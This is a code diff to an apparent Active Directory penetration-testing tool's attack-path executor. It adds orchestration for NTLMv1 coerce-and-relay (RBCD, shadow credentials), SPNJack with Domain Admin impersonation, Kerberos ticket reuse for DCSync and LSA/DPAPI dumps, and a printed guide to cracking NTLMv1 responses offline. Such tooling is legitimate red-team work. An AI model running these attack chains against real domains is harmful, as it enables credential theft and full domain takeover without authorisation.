@@ -58,6 +58,10 @@ from adscan_internal.services.attack_graph_service import (
     resolve_group_user_members,
     update_edge_status_by_labels,
 )
+from adscan_internal.services.credential_store_service import (
+    get_capability_bearing_ccache,
+    resolve_execution_credential,
+)
 from adscan_internal.services.attack_graph_runtime_service import (
     clear_attack_path_execution,
     get_attack_path_followup_context,
@@ -183,21 +187,47 @@ def _is_audit_mode(shell: Any) -> bool:
 def _get_stored_domain_credential_for_user(
     shell: Any, *, domain: str, username: str
 ) -> str | None:
-    """Return stored credential for a domain user using case-insensitive lookup."""
+    """Return stored credential for a domain user using case-insensitive lookup.
+
+    Prefers a password / NT hash from the ``credentials`` map. Falls back to a
+    registered Kerberos ccache path from ``kerberos_tickets`` when no password/
+    hash is stored — the NTLM-disabled / AES-only case, where a PKINIT TGT
+    (e.g. from ADCS Pass-the-Certificate) is the only usable credential. The
+    ccache path is itself a valid credential: downstream Kerberos-backed steps
+    (DCSync/DRSUAPI, LDAP, SMB) accept a ``.ccache`` path and select it.
+    """
     normalized_target = _normalize_account(username)
     if not normalized_target:
         return None
     domain_data = getattr(shell, "domains_data", {}).get(domain, {})
+    # Capability-bearing override (ESC13 PtC): when a ccache is explicitly marked
+    # prefer-over-password for THIS user, hand it back instead of the password —
+    # the password cannot reproduce the synthetic PAC group SID. Marker absent
+    # for the user => keep the password-first default below (no global change).
+    capability_ccache = get_capability_bearing_ccache(
+        getattr(shell, "domains_data", {}), domain=domain, username=normalized_target
+    )
+    if capability_ccache:
+        return capability_ccache
     credentials = domain_data.get("credentials")
-    if not isinstance(credentials, dict):
-        return None
-    for stored_user, stored_credential in credentials.items():
-        if _normalize_account(str(stored_user)) != normalized_target:
-            continue
-        if not isinstance(stored_credential, str):
-            return None
-        candidate = stored_credential.strip()
-        return candidate or None
+    if isinstance(credentials, dict):
+        for stored_user, stored_credential in credentials.items():
+            if _normalize_account(str(stored_user)) != normalized_target:
+                continue
+            if isinstance(stored_credential, str) and stored_credential.strip():
+                return stored_credential.strip()
+            break
+    # Fallback: a registered Kerberos ccache (no password/hash available).
+    # kerberos_tickets maps {username: ccache_path} and is populated by
+    # Pass-the-Certificate even when UnPAC-the-hash recovered no NT hash.
+    kerberos_tickets = domain_data.get("kerberos_tickets")
+    if isinstance(kerberos_tickets, dict):
+        for stored_user, ticket_path in kerberos_tickets.items():
+            if _normalize_account(str(stored_user)) != normalized_target:
+                continue
+            if isinstance(ticket_path, str) and ticket_path.strip():
+                return ticket_path.strip()
+            break
     return None
 
 
@@ -1392,6 +1422,85 @@ def annotate_summary_execution_readiness(
     if readiness:
         meta.update(readiness)
     return current
+
+
+# ── NTLMv1 coerce→relay execution dispatch (sub-project #3) ────────────────────
+# The relay relations map to the existing native handler ``run_relay_ldap``
+# (``relay_rbcd.py``), which already owns coerce + drop-the-MIC relay + the
+# RBCD / shadow-creds write method + the create-vs-reuse delegate selector + the
+# feasibility gates. The graph relation IS the technique: the RBCD path runs
+# ``forced_method="rbcd"``; the ShadowCreds path runs ``forced_method="shadow-creds"``
+# (the CLI method spelling, with a hyphen — see ``relay_rbcd._METHOD_SHADOW``).
+_NTLMV1_RELAY_METHOD_BY_RELATION: dict[str, str] = {
+    "ntlmv1relayrbcd": "rbcd",
+    "ntlmv1relayshadowcreds": "shadow-creds",
+}
+
+
+def relay_method_for_relation(relation: str) -> str | None:
+    """Return the ``run_relay_ldap`` method for an NTLMv1 relay relation, else None.
+
+    Only the two RELAY relations map here; ``CrackNTLMv1`` is an offline-crack
+    technique with its own dispatch arm (it does not drive ``run_relay_ldap``).
+    """
+    return _NTLMV1_RELAY_METHOD_BY_RELATION.get(str(relation or "").strip().lower())
+
+
+def is_crackntlmv1_relation(relation: str) -> bool:
+    """Return True when ``relation`` is the offline NTLMv1-crack attack step."""
+    return str(relation or "").strip().lower() == "crackntlmv1"
+
+
+def build_relay_ldap_args_for_step(
+    *,
+    victim_ip: str,
+    domain: str,
+) -> str:
+    """Build the ``run_relay_ldap`` argument string for a relay attack-step.
+
+    The victim IP is the positional target; the relay-target DC is resolved by
+    the handler from domain context, so only the victim + domain are passed.
+    ``forced_method`` is supplied separately by the dispatch branch.
+    """
+    parts = [str(victim_ip or "").strip()]
+    dom = str(domain or "").strip()
+    if dom:
+        parts.append(f"--domain {dom}")
+    return " ".join(p for p in parts if p)
+
+
+def _resolve_step_victim_ip(shell: Any, domain: str, computer_label: str) -> str:
+    """Resolve a Computer node label to a reachable IP for the relay handler.
+
+    Reuses the canonical target-viability resolver (the same single source of
+    truth the execution-gate uses for every Computer target), which returns the
+    matched IPs from the workspace inventory. Returns ``""`` when no IP is known.
+    """
+    label = str(computer_label or "").strip()
+    if not label:
+        return ""
+    # Already an IP → use it as-is.
+    resolved = _resolve_session_target_ip(label)
+    if resolved and resolved != label:
+        # gethostbyname succeeded (label was a hostname).
+        pass
+    node = get_node_by_label(shell, domain, label=label)
+    if isinstance(node, dict):
+        try:
+            viability = assess_computer_target_viability(
+                shell, domain=domain, principal_name=label, node=node,
+            )
+            for ip in viability.matched_ips or ():
+                ip_str = str(ip or "").strip()
+                if ip_str:
+                    return ip_str
+        except Exception as exc:  # noqa: BLE001 — telemetry sink, fall through
+            telemetry.capture_exception(exc)
+    # Fallbacks: a DNS-resolvable hostname, else the bare label only if it is
+    # already an IP (so we never feed the relay handler a hostname it can't use).
+    if resolved and resolved != label:
+        return resolved
+    return ""
 
 
 def offer_attack_path_execution(
@@ -2772,6 +2881,13 @@ def _resolve_domain_password(shell: object, domain: str, username: str) -> str |
     domains_data = getattr(shell, "domains_data", None)
     if not isinstance(domains_data, dict):
         return None
+    # Capability-bearing override (ESC13 PtC): prefer the marked ccache over a
+    # stored password/hash for this user only when the marker is set.
+    capability_ccache = get_capability_bearing_ccache(
+        domains_data, domain=domain, username=username
+    )
+    if capability_ccache:
+        return capability_ccache
     domain_data = domains_data.get(domain)
     if not isinstance(domain_data, dict):
         return None
@@ -2910,6 +3026,7 @@ def _resolve_smb_spn_target(
         ``kdc_ip`` is the domain DC IP, or ``None`` when unknown.
     """
     from adscan_internal.models.domain import resolve_dc_ip
+    from adscan_internal.services.domain_controller_classifier import is_dc_host
     from adscan_internal.services.domain_posture import get_posture
     from adscan_internal.services.kerberos_spn_resolution import (
         resolve_spn_or_decide_ntlm,
@@ -2947,8 +3064,16 @@ def _resolve_smb_spn_target(
     except Exception:  # noqa: BLE001
         posture_snapshot = None
 
-    is_dc_target = bool(
-        target_host and kdc_ip and str(target_host).strip() == str(kdc_ip).strip()
+    # Alias-aware DC detection: a target supplied as an FQDN or short name
+    # never string-equals ``kdc_ip``, so the old ``target_host == kdc_ip``
+    # compare silently misclassified DCs and drove the wrong altservice
+    # (ldap-for-DCSync vs cifs). ``is_dc_host`` matches IP <-> short <-> FQDN
+    # <-> HOST$ via the shared host matcher and the workspace inventory.
+    is_dc_target = is_dc_host(
+        host=target_host,
+        domains_data=domains_data,
+        domain=domain,
+        ip_hostname_inventory=inventory,
     )
     resolution = resolve_spn_or_decide_ntlm(
         target_host=target_host,
@@ -3057,10 +3182,20 @@ def _execute_writelogonscript_precheck(
     context_username: str | None,
     context_password: str | None,
 ) -> tuple[str, dict[str, Any]]:
-    """Confirm logon-script staging access by uploading a benign batch file probe."""
+    """Confirm logon-script staging access for the current execution token.
+
+    Tries a non-intrusive MxAc effective-access check on the target share
+    root first (no file written). If MxAc confirms WRITE the precheck passes
+    without uploading anything; if MxAc is undetermined (server does not
+    honour it) it falls back to the benign test-file upload probe; if MxAc
+    definitively shows no WRITE the candidate fails fast.
+    """
     from adscan_internal.services.smb_path_access_service import SMBPathAccessService
     from adscan_internal.services.attack_graph_service import (
         _build_writelogonscript_staging_candidates,
+    )
+    from adscan_internal.services.smb_effective_access_service import (
+        query_effective_root_access,
     )
 
     exec_username = _resolve_execution_user(
@@ -3154,6 +3289,82 @@ def _execute_writelogonscript_precheck(
     for candidate in ordered_candidates:
         share_name = str(candidate.get("share") or "NETLOGON").strip() or "NETLOGON"
         directory_path = str(candidate.get("path") or "").strip()
+
+        # Step 1: non-intrusive MxAc effective-access check on the share root for
+        # the current execution token. Confirms WRITE without writing any file.
+        effective = query_effective_root_access(
+            host=target_host,
+            share=share_name,
+            username=str(exec_username),
+            password=password,
+            auth_domain=str(domain),
+            domain=str(domain),
+            use_kerberos=use_kerberos,
+            kdc_host=spn_kdc_ip if use_kerberos else None,
+            spn_host=spn_host,
+        )
+        if effective.succeeded:
+            if effective.can_write:
+                attempted_candidates.append(
+                    {
+                        "name": str(candidate.get("name") or ""),
+                        "share": share_name,
+                        "path": directory_path,
+                        "validation": str(candidate.get("validation") or "")
+                        .strip()
+                        .lower()
+                        or "runtime",
+                        "success": True,
+                        "status_code": "MXAC_WRITE",
+                        "error": "",
+                    }
+                )
+                return (
+                    "precheck_succeeded",
+                    {
+                        "user": exec_username,
+                        "target_host": target_host,
+                        "share": share_name,
+                        "path": directory_path,
+                        "selected_staging_candidate": str(
+                            candidate.get("name") or share_name
+                        ),
+                        "probe_path": "",
+                        "auth_mode": effective.auth_mode,
+                        "netlogon_write_confirmed": True,
+                        "reason": "netlogon_write_confirmed_mxac",
+                        "attempted_candidates": attempted_candidates,
+                    },
+                )
+            # MxAc definitively reports NO write on this candidate root — fail
+            # fast for it without an upload, then try the next candidate.
+            attempted_candidates.append(
+                {
+                    "name": str(candidate.get("name") or ""),
+                    "share": share_name,
+                    "path": directory_path,
+                    "validation": str(candidate.get("validation") or "")
+                    .strip()
+                    .lower()
+                    or "runtime",
+                    "success": False,
+                    "status_code": "MXAC_NO_WRITE",
+                    "error": "MxAc effective access reports no write on share root",
+                }
+            )
+            last_failure = {
+                "reason": "netlogon_write_denied_mxac",
+                "error": "MxAc effective access reports no write on share root",
+                "status_code": "MXAC_NO_WRITE",
+                "share": share_name,
+                "path": directory_path,
+                "probe_path": "",
+                "auth_mode": effective.auth_mode,
+            }
+            continue
+
+        # Step 2: MxAc undetermined (server doesn't honour it / transport
+        # error) — fall back to the benign test-file upload probe.
         probe_result = probe_service.probe_file_upload(
             target_host=target_host,
             share_name=share_name,
@@ -5810,6 +6021,59 @@ def execute_selected_attack_path(
             except Exception as exc:  # noqa: BLE001
                 telemetry.capture_exception(exc)
 
+        def _halt_path_after_failed_step(
+            *,
+            action: str,
+            from_label: str,
+            to_label: str,
+            step_index: int,
+            executable_step_position: int,
+            actor: str | None = None,
+        ) -> None:
+            """Single source for the universal halt-on-failure of a path step.
+
+            Emits the SAME operator warning and ``path_aborted`` execution event
+            for every executing step type once its handler reports a definitive
+            failure (the exploit ran and was rejected). The target state the next
+            step requires was never established, so the caller MUST ``break`` out
+            of the step loop immediately after calling this.
+
+            This is the unified generalization of the halts that previously lived
+            only in the generic ACE-step path and the SPNJack point-fix. Only a
+            *failed* execution must reach here. Context/membership steps,
+            blocked/unavailable pre-execution aborts, and legitimately-skipped
+            steps must NOT call this (they keep their own ``continue``/``return``
+            for non-failure reasons), so the tri-state distinction
+            (success | failed | not_applicable) is preserved structurally by the
+            call sites instead of being inferred from persisted edge status.
+            """
+            marked_action = action
+            marked_target = mark_sensitive(to_label or "", "node")
+            print_warning(
+                f"[dim]Step {executable_step_position}/{total_executable_steps}[/dim] "
+                f"[bold]{marked_action}[/bold] on {marked_target} failed — "
+                "remaining path steps skipped."
+            )
+            _record_attack_path_execution_event(
+                shell,
+                domain=domain,
+                summary=summary,
+                event_stage="path_aborted",
+                message=(
+                    f"{action} failed on {to_label}; "
+                    "subsequent steps require this to succeed and were skipped."
+                ),
+                step_index=step_index,
+                total_steps=total_executable_steps,
+                executable_step_index=executable_step_position,
+                last_executable_idx=last_executable_idx,
+                action=action,
+                from_label=from_label,
+                to_label=to_label,
+                step_status="aborted",
+                actor=actor,
+            )
+
         def _handle_failed_adcs_step(
             action: str,
             from_label: str,
@@ -5938,10 +6202,22 @@ def execute_selected_attack_path(
             the centralised helper.
             """
             captured_credential = ""
+            credential_type = "nt_hash"
             if esc_result is not None:
                 captured_credential = str(
                     getattr(esc_result, "nt_hash", "") or ""
                 ).strip()
+                if not captured_credential:
+                    # NTLM-disabled / AES-only: no NT hash was recovered, but a
+                    # PKINIT TGT (ccache) was obtained and registered in
+                    # kerberos_tickets. Hand it off as the credential so the
+                    # orchestrator proceeds as the compromised principal;
+                    # downstream Kerberos-backed steps (DCSync/DRSUAPI, LDAP, SMB)
+                    # select the ccache from kerberos_tickets on their own.
+                    ccache = str(getattr(esc_result, "ccache_path", "") or "").strip()
+                    if ccache:
+                        captured_credential = ccache
+                        credential_type = "ccache"
             _handle_successful_credential_step(
                 action,
                 from_label,
@@ -5949,7 +6225,7 @@ def execute_selected_attack_path(
                 notes=notes,
                 captured_principal=impersonated_target,
                 captured_credential=captured_credential or None,
-                credential_type="nt_hash",
+                credential_type=credential_type,
             )
 
         def _mark_blocked_steps(
@@ -7673,30 +7949,12 @@ def execute_selected_attack_path(
                 # A False result means the exploit ran and was rejected — the
                 # target state required by the next step was never established.
                 if ace_result is False:
-                    marked_action = action
-                    marked_target = mark_sensitive(to_label or "", "node")
-                    print_warning(
-                        f"[dim]Step {executable_step_position}/{total_executable_steps}[/dim] "
-                        f"[bold]{marked_action}[/bold] on {marked_target} failed — "
-                        "remaining path steps skipped."
-                    )
-                    _record_attack_path_execution_event(
-                        shell,
-                        domain=domain,
-                        summary=summary,
-                        event_stage="path_aborted",
-                        message=(
-                            f"{action} failed on {to_label}; "
-                            "subsequent steps require this to succeed and were skipped."
-                        ),
-                        step_index=idx,
-                        total_steps=total_executable_steps,
-                        executable_step_index=executable_step_position,
-                        last_executable_idx=last_executable_idx,
+                    _halt_path_after_failed_step(
                         action=action,
                         from_label=from_label,
                         to_label=to_label,
-                        step_status="aborted",
+                        step_index=idx,
+                        executable_step_position=executable_step_position,
                         actor=exec_context.exec_username,
                     )
                     break
@@ -9506,6 +9764,151 @@ def execute_selected_attack_path(
                         shell.ptc_certipy(domain, esc8_result.pfx_path)
                 continue
 
+            # NTLMv1 coerce→relay→(RBCD|ShadowCreds) — sub-project #3. The relay
+            # relation maps to the native handler run_relay_ldap; on a successful
+            # run the Ntlmv1Enabled surface marker is promoted to exploited and
+            # the relay edge's own status flips via the handler's update path.
+            relay_method = relay_method_for_relation(key)
+            if relay_method is not None:
+                action_name = action or key
+                if not from_label or not to_label:
+                    print_warning(
+                        f"Cannot execute {action_name}: missing from/to details."
+                    )
+                    return execution_started
+                victim_ip = _resolve_step_victim_ip(shell, domain, to_label)
+                if not victim_ip:
+                    _mark_blocked_step(
+                        action_name,
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Could not resolve victim host IP for the relay",
+                    )
+                    return execution_started
+                from adscan_internal.cli.relay_rbcd import run_relay_ldap  # noqa: PLC0415
+
+                relay_args = build_relay_ldap_args_for_step(
+                    victim_ip=victim_ip, domain=domain,
+                )
+                execution_started = True
+                with _active_step_context(
+                    action=action_name,
+                    from_label=from_label,
+                    to_label=to_label,
+                    notes={"relay_method": relay_method, "victim_ip": victim_ip},
+                ):
+                    try:
+                        relay_outcome = run_relay_ldap(
+                            shell, relay_args, forced_method=relay_method
+                        )
+                    except Exception as exc:  # noqa: BLE001
+                        telemetry.capture_exception(exc)
+                        _handle_failed_adcs_step(
+                            action_name,
+                            from_label,
+                            to_label,
+                            notes={"relay_method": relay_method},
+                        )
+                        return execution_started
+                    if relay_outcome != "success":
+                        # The relay did not land (not viable / failed / precondition
+                        # abort -> None). Mark THIS step and STOP — do NOT promote the
+                        # Ntlmv1Enabled surface marker and do NOT fall through to the
+                        # dependent steps (e.g. a Dump-LSA that assumes the relay
+                        # already compromised the target). An attempted relay that
+                        # failed mid-chain -> "attempted"; a not-viable / precondition
+                        # abort (never executed) -> "blocked".
+                        step_status = (
+                            "attempted" if relay_outcome == "failed" else "blocked"
+                        )
+                        try:
+                            update_edge_status_by_labels(
+                                shell,
+                                domain,
+                                from_label=from_label,
+                                relation=action_name,
+                                to_label=to_label,
+                                status=step_status,
+                                notes={
+                                    "relay_method": relay_method,
+                                    "relay_outcome": relay_outcome or "not_viable",
+                                },
+                            )
+                        except Exception as exc:  # noqa: BLE001
+                            telemetry.capture_exception(exc)
+                        return execution_started
+                    # Relay landed: mark the relay edge success, promote the
+                    # Ntlmv1Enabled surface marker, then continue to dependent steps.
+                    try:
+                        update_edge_status_by_labels(
+                            shell,
+                            domain,
+                            from_label=from_label,
+                            relation=action_name,
+                            to_label=to_label,
+                            status="success",
+                            notes={"relay_method": relay_method},
+                        )
+                    except Exception as exc:  # noqa: BLE001
+                        telemetry.capture_exception(exc)
+                    try:
+                        from adscan_internal.services.attack_graph_derived import (  # noqa: PLC0415
+                            insert_derived_edge,
+                        )
+
+                        insert_derived_edge(
+                            shell=shell,
+                            domain=domain,
+                            source="ADscan",
+                            relation="Ntlmv1Enabled",
+                            target=to_label,
+                            technique_id=f"ntlmv1_relay_{relay_method.replace('-', '_')}",
+                            evidence_path=None,
+                            extra={"relay_method": relay_method},
+                        )
+                    except Exception as exc:  # noqa: BLE001
+                        telemetry.capture_exception(exc)
+                continue
+
+            # NTLMv1 offline crack — sub-project #3 refinement. The capture is the
+            # automatable half (coerce + capture the NTLMv1 challenge/response via
+            # the NTLMv1 capture sweep); the crack itself is an OFFLINE submission
+            # (crack.sh rainbow tables / hashcat mode 14000) that the operator runs
+            # out-of-band. We surface a guided advisory rather than fabricate an
+            # in-band crack executor — this attack step has no relay/LDAP write.
+            if is_crackntlmv1_relation(key):
+                action_name = action or key
+                if not from_label or not to_label:
+                    print_warning(
+                        f"Cannot execute {action_name}: missing from/to details."
+                    )
+                    return execution_started
+                victim_ip = _resolve_step_victim_ip(shell, domain, to_label)
+                print_panel(
+                    (
+                        "NTLMv1 is the most universal of the three avenues: it needs "
+                        "no relay target and is unaffected by LDAP signing, channel "
+                        "binding, ADCS, or DC count.\n\n"
+                        f"1. Capture the victim's NTLMv1 challenge/response "
+                        f"({mark_sensitive(victim_ip or to_label, 'host')}) using the "
+                        "NTLMv1 capture sweep (coerce the host to authenticate to a "
+                        "listener).\n"
+                        "2. Crack the captured DES-based response OFFLINE "
+                        "(crack.sh rainbow tables or hashcat mode 14000) to recover the "
+                        "machine account NT hash.\n"
+                        "3. The recovered machine hash is the compromise of this "
+                        "computer; if it is a DC, it chains to DCSync via the graph."
+                    ),
+                    title="NTLMv1 Offline Crack — operator-guided",
+                    border_style="cyan",
+                )
+                # Capture is automatable but lives in the NTLMv1 capture workflow;
+                # the offline crack is out-of-band, so the step stays operator-guided
+                # (no automatic exploited promotion — that happens when the recovered
+                # hash is validated and recorded as a credential).
+                continue
+
             if key == "adcsesc9":
                 if not from_label or not to_label:
                     print_warning("Cannot execute ADCSESC9: missing from/to details.")
@@ -10398,6 +10801,7 @@ def execute_selected_attack_path(
                     return execution_started
 
                 execution_started = True
+                hassession_step_failed = False
                 with _active_step_context(
                     action=action,
                     from_label=from_label,
@@ -10623,6 +11027,7 @@ def execute_selected_attack_path(
                             "HasSession exploitation executed, but Domain Admin "
                             "membership could not be verified."
                         )
+                        hassession_step_failed = True
 
                     # Rollback — runs on success AND failure. If nothing was
                     # created or modified this is a no-op. Crash recovery is
@@ -10643,6 +11048,19 @@ def execute_selected_attack_path(
                             non_interactive=non_interactive,
                         )
                         _clear_hassession_cleanup_checkpoint(shell, domain=domain)
+                if hassession_step_failed:
+                    # The privileged membership the downstream steps depend on
+                    # was never established (and was rolled back) — halt instead
+                    # of attempting doomed follow-ups.
+                    _halt_path_after_failed_step(
+                        action=action,
+                        from_label=from_label,
+                        to_label=to_label,
+                        step_index=idx,
+                        executable_step_position=executable_step_position,
+                        actor=exec_username,
+                    )
+                    break
                 continue
 
             if key == "allowedtodelegate":
@@ -10735,6 +11153,152 @@ def execute_selected_attack_path(
                     )
                 continue
 
+            if key == "spnjack":
+                if not from_label or not to_label:
+                    print_warning("Cannot execute SPNJack: missing from/to details.")
+                    return execution_started
+
+                # The vehicle SPN to relocate + its current owner + plant mode are
+                # stamped on the edge by derive_spnjack_edges (the modeling layer).
+                delegated_spn = str(details.get("delegated_spn") or "").strip()
+                vehicle_mode = str(details.get("vehicle_mode") or "delspn_from_owner").strip()
+                owner_label = str(details.get("vehicle_spn_owner") or "").strip()
+                vehicle_owner_samname = owner_label.split("@", 1)[0].strip() or None
+                if not delegated_spn:
+                    print_warning(
+                        "SPNJack edge missing 'delegated_spn' in details — re-run the "
+                        "LDAP collector to refresh."
+                    )
+                    _mark_blocked_step(
+                        action, from_label, to_label, kind="unavailable",
+                        reason="Edge missing delegated_spn (stale graph?)",
+                    )
+                    return execution_started
+
+                # P (the delegating principal that holds KCD + T2A4D) is the source.
+                exec_username = _resolve_execution_user(
+                    shell, domain=domain, context_username=context_username,
+                    summary=summary, from_label=from_label,
+                )
+                password = context_password or _resolve_domain_password(
+                    shell, domain, exec_username
+                )
+                if not password:
+                    marked_user = mark_sensitive(exec_username or from_label, "user")
+                    print_warning(
+                        f"Cannot execute this step: no stored domain credential found for {marked_user}."
+                    )
+                    _mark_blocked_step(
+                        action, from_label, to_label, kind="unavailable",
+                        reason="Missing stored credential for execution user",
+                    )
+                    return execution_started
+
+                # Target computer T: sAMAccountName from the label, FQDN promoted via
+                # the canonical Kerberos-SPN normalizer (never a short host / IP).
+                from adscan_internal.services._kerberos_spn import (  # noqa: PLC0415
+                    normalize_kerberos_target_hostname,
+                )
+                target_samname = str(to_label).split("@", 1)[0].strip()
+                short_host = target_samname.rstrip("$")
+                target_fqdn = (
+                    normalize_kerberos_target_hostname(short_host, domain)
+                    or f"{short_host}.{domain}".lower()
+                )
+                domain_data = shell.domains_data.get(domain, {})
+                dc_ip = resolve_dc_ip(domain_data) or ""
+                try:
+                    from adscan_internal.services.domain_posture import (  # noqa: PLC0415
+                        get_posture,
+                    )
+                    posture_snapshot = get_posture(shell.domains_data, domain=domain)
+                except Exception:  # noqa: BLE001
+                    posture_snapshot = None
+
+                # Impersonation target: let the operator choose (Domain Admin
+                # default), EXCLUDING Protected Users members and accounts flagged
+                # "sensitive and cannot be delegated" — S4U2Self cannot impersonate
+                # those, so offering them would mint a doomed ticket. Centralized
+                # helper reused across delegation/ADCS/RODC flows; auto-resolves to
+                # the default in non-interactive mode.
+                from adscan_internal.cli.privileged_target_selection import (  # noqa: PLC0415
+                    resolve_privileged_target_user,
+                )
+                impersonate_user = (
+                    resolve_privileged_target_user(
+                        shell,
+                        domain=domain,
+                        purpose="SPNJack impersonation (S4U2Self)",
+                        require_domain_admin=True,
+                        exclude_not_delegated=True,
+                        exclude_protected_users=True,
+                    )
+                    or "Administrator"
+                )
+
+                execution_started = True
+                with _active_step_context(
+                    action="SPNJack", from_label=from_label, to_label=to_label,
+                    notes={"username": exec_username, "delegated_spn": delegated_spn},
+                ):
+                    try:
+                        update_edge_status_by_labels(
+                            shell, domain, from_label=from_label, relation="SPNJack",
+                            to_label=to_label, status="attempted",
+                            notes={"username": exec_username},
+                        )
+                    except Exception as exc:  # noqa: BLE001
+                        telemetry.capture_exception(exc)
+
+                    from adscan_internal.services.exploitation.spnjack_executor import (  # noqa: PLC0415
+                        run_execute_spnjack,
+                    )
+                    spnjack_result = run_execute_spnjack(
+                        shell=shell, domain=domain, dc_ip=dc_ip,
+                        principal_user=exec_username, principal_secret=password,
+                        target_samname=target_samname, target_fqdn=target_fqdn,
+                        vehicle_spn=delegated_spn,
+                        vehicle_owner_samname=vehicle_owner_samname,
+                        vehicle_mode=vehicle_mode,
+                        impersonate_user=impersonate_user,
+                        posture_snapshot=posture_snapshot,
+                    )
+                    try:
+                        update_edge_status_by_labels(
+                            shell, domain, from_label=from_label, relation="SPNJack",
+                            to_label=to_label,
+                            status="success" if spnjack_result.success else "failed",
+                            notes={
+                                "username": exec_username,
+                                "minted_spns": spnjack_result.minted_spns,
+                                "tickets_persisted": spnjack_result.tickets_persisted,
+                                "spn_reverted": spnjack_result.spn_reverted,
+                                "error": spnjack_result.error,
+                            },
+                        )
+                    except Exception as exc:  # noqa: BLE001
+                        telemetry.capture_exception(exc)
+                    if not spnjack_result.success:
+                        print_warning(
+                            f"SPNJack did not complete: "
+                            f"{spnjack_result.error or 'unknown error'}."
+                        )
+                if not spnjack_result.success:
+                    # A failed SPNJack means the privileged service ticket the
+                    # downstream DCSync / DumpLSA step depends on was never minted —
+                    # halt the path via the unified halt mechanism instead of
+                    # offering a doomed follow-up.
+                    _halt_path_after_failed_step(
+                        action=action,
+                        from_label=from_label,
+                        to_label=to_label,
+                        step_index=idx,
+                        executable_step_position=executable_step_position,
+                        actor=exec_username,
+                    )
+                    break
+                continue
+
             if key in {"dumplsa", "dumpdpapi"}:
                 if not from_label:
                     print_warning(
@@ -10746,30 +11310,6 @@ def execute_selected_attack_path(
                         to_label,
                         kind="unavailable",
                         reason="Missing source host details",
-                    )
-                    return execution_started
-
-                exec_username = _resolve_execution_user(
-                    shell,
-                    domain=domain,
-                    context_username=context_username,
-                    summary=summary,
-                    from_label=from_label,
-                )
-                password = context_password or _resolve_domain_password(
-                    shell, domain, exec_username
-                )
-                if not exec_username or not password:
-                    marked_user = mark_sensitive(exec_username or from_label, "user")
-                    print_warning(
-                        f"Cannot execute this step: no stored domain credential found for {marked_user}."
-                    )
-                    _mark_blocked_step(
-                        action,
-                        from_label,
-                        to_label,
-                        kind="unavailable",
-                        reason="Missing stored credential for execution user",
                     )
                     return execution_started
 
@@ -10789,6 +11329,51 @@ def execute_selected_attack_path(
                         to_label,
                         kind="unavailable",
                         reason="Source node is not a resolvable host",
+                    )
+                    return execution_started
+
+                # Scoped-ticket-first: if a prior step (RBCD/S4U, constrained
+                # delegation) minted a service ticket for THIS host, reuse it -
+                # the dump executor accepts a .ccache path as the credential and
+                # runs as the ticket's impersonated principal. The alias-aware
+                # host match guarantees a cifs/<other-host> ticket is never used
+                # here. relation=action (dumplsa/dumpdpapi) -> cifs via the
+                # central map; preferent matching keeps a TGT-bearing ccache
+                # usable even if its own SPN class differs. Fall back to the
+                # generic resolver on no match.
+                scoped = resolve_execution_credential(
+                    shell, domain=domain, host=source_host, relation=action
+                )
+                if scoped is not None:
+                    exec_username, password = scoped
+                    print_info_debug(
+                        f"attack_paths {action}: reusing host-scoped service ticket "
+                        f"for {mark_sensitive(source_host, 'hostname')} as "
+                        f"{mark_sensitive(exec_username, 'user')} "
+                        f"(ccache={mark_sensitive(password, 'path')})"
+                    )
+                else:
+                    exec_username = _resolve_execution_user(
+                        shell,
+                        domain=domain,
+                        context_username=context_username,
+                        summary=summary,
+                        from_label=from_label,
+                    )
+                    password = context_password or _resolve_domain_password(
+                        shell, domain, exec_username
+                    )
+                if not exec_username or not password:
+                    marked_user = mark_sensitive(exec_username or from_label, "user")
+                    print_warning(
+                        f"Cannot execute this step: no stored domain credential found for {marked_user}."
+                    )
+                    _mark_blocked_step(
+                        action,
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Missing stored credential for execution user",
                     )
                     return execution_started
 
@@ -10919,6 +11504,27 @@ def execute_selected_attack_path(
                     bo_outcome = get_last_ace_execution_outcome(shell) or {}
                     _apply_execution_outcome_context_handoff(bo_outcome)
                     execution_started = True
+                else:
+                    # The escalation ran but did not recover the DC machine
+                    # account the downstream DCSync/secretsdump depends on —
+                    # halt instead of attempting a doomed follow-up.
+                    _update_attack_path_step_status_at_index(
+                        shell,
+                        domain=domain,
+                        summary=summary,
+                        step_index=idx - 1,
+                        status="failed",
+                        notes={"user": bo_username},
+                    )
+                    _halt_path_after_failed_step(
+                        action=action,
+                        from_label=from_label,
+                        to_label=to_label,
+                        step_index=idx,
+                        executable_step_position=executable_step_position,
+                        actor=bo_username,
+                    )
+                    break
                 continue
 
             # Unknown supported key shouldn't happen due to pre-check, but keep safe.
